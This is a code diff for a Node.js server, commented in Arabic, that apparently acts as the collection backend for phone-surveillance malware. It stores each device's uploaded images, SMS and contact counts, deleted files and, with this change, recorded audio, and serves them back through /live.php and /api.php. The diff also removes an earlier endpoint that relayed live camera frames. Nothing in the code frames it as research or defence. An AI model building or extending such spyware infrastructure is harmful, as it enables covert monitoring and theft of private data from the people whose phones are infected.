@@ -11,73 +11,18 @@ app.use(cors());
 app.use(bodyParser.json({ limit: '500mb' }));
 app.use(express.static('public'));
 
-// ✅ استقبال الإطارات الخام من الكاميرا
-app.use('/camera_upload', express.raw({ type: '*/*', limit: '10mb' }));
-
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 
 const devicesFile = path.join(dataDir, 'devices.json');
 if (!fs.existsSync(devicesFile)) fs.writeFileSync(devicesFile, '[]');
 
-// ✅ تخزين إطارات الكاميرا
-let cameraFrames = {};
-let cameraClients = {};
-
-// ============ استقبال إطارات الكاميرا ============
-app.post('/camera_upload/:deviceId', (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        if (req.body && req.body.length > 0) {
-            cameraFrames[deviceId] = req.body;
-            
-            // ✅ إرسال لكل المشاهدين
-            if (cameraClients[deviceId]) {
-                cameraClients[deviceId].forEach(client => {
-                    try {
-                        client.write(`--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${req.body.length}\r\n\r\n`);
-                        client.write(req.body);
-                        client.write('\r\n\r\n');
-                    } catch (e) {}
-                });
-            }
-        }
-        res.json({ success: true });
-    } catch (e) {
-        res.json({ error: e.message });
-    }
-});
-
-// ============ عرض بث الكاميرا ============
-app.get('/camera_stream/:deviceId', (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        
-        res.writeHead(200, {
-            'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Pragma': 'no-cache',
-            'Expires': '0',
-            'Connection': 'keep-alive',
-            'Access-Control-Allow-Origin': '*'
-        });
-        
-        if (!cameraClients[deviceId]) cameraClients[deviceId] = [];
-        cameraClients[deviceId].push(res);
-        
-        req.on('close', () => {
-            if (cameraClients[deviceId]) {
-                cameraClients[deviceId] = cameraClients[deviceId].filter(c => c !== res);
-            }
-        });
-    } catch (e) {}
-});
-
 // ============ استقبال البيانات ============
 app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
         
+        // ✅ حفظ الصور
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -92,6 +37,21 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
+        // ✅ حفظ الصوتيات
+        if (data.type === 'audio_data' && data.file_data) {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const audioFile = path.join(deviceDir, 'audio_data.json');
+            let audioData = [];
+            if (fs.existsSync(audioFile)) audioData = JSON.parse(fs.readFileSync(audioFile, 'utf8'));
+            audioData.push({ name: data.file_name, data: data.file_data, size: data.file_size, date: data.timestamp });
+            fs.writeFileSync(audioFile, JSON.stringify(audioData, null, 2));
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true, audio_count: audioData.length });
+        }
+        
+        // ✅ حفظ المحذوفات
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -110,6 +70,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
         
+        // ✅ البيانات العادية
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) { fs.mkdirSync(deviceDir, { recursive: true }); fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true }); }
@@ -199,6 +160,7 @@ app.get('/live.php', (req, res) => {
         const liveFile = path.join(dataDir, deviceId, 'live.json');
         const dataFile = path.join(dataDir, deviceId, 'data.json');
         const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
+        const audioFile = path.join(dataDir, deviceId, 'audio_data.json');
         const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
         
         let response = { 
@@ -216,6 +178,7 @@ app.get('/live.php', (req, res) => {
             sms_count: 0, 
             contacts_count: 0, 
             images_count: 0, 
+            audio_count: 0, 
             apps_count: 0, 
             deleted_count: 0 
         };
@@ -245,6 +208,10 @@ app.get('/live.php', (req, res) => {
         
         if (fs.existsSync(imagesFile)) {
             response.images_count = JSON.parse(fs.readFileSync(imagesFile, 'utf8')).length;
+        }
+        
+        if (fs.existsSync(audioFile)) {
+            response.audio_count = JSON.parse(fs.readFileSync(audioFile, 'utf8')).length;
         }
         
         if (fs.existsSync(deletedFile)) {
@@ -307,6 +274,13 @@ app.get('/api.php', (req, res) => {
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
+            return res.json([]);
+        }
+        
+        // ✅ استرجاع الصوتيات
+        if (action === 'get_audio_data') {
+            const audioFile = path.join(dataDir, deviceId, 'audio_data.json');
+            if (fs.existsSync(audioFile)) return res.json(JSON.parse(fs.readFileSync(audioFile, 'utf8')));
             return res.json([]);
         }
         
